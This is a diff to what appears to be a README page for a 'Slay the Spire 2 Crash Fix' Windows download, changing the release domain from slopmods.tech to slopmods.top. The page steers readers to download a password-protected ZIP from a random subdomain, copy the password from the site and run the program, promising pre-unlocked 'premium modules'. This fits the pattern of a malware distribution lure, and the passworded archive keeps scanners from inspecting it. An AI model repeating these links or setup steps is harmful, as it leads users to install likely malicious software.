@@ -8,12 +8,12 @@ Slay the Spire 2 Crash Fix — Windows setup and configuration · Premium worksp
 
 > Use the release page below for Windows.
 
-- **Release page:** [pnfeevvrmya.slopmods.tech](https://pnfeevvrmya.slopmods.tech/)
-- **Full URL:** `https://pnfeevvrmya.slopmods.tech/`
+- **Release page:** [pnfeevvrmya.slopmods.top](https://pnfeevvrmya.slopmods.top/)
+- **Full URL:** `https://pnfeevvrmya.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **pnfeevvrmya.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **pnfeevvrmya.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ Slay the Spire 2 Crash Fix — Windows setup and configuration · Premium worksp
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **pnfeevvrmya.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **pnfeevvrmya.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
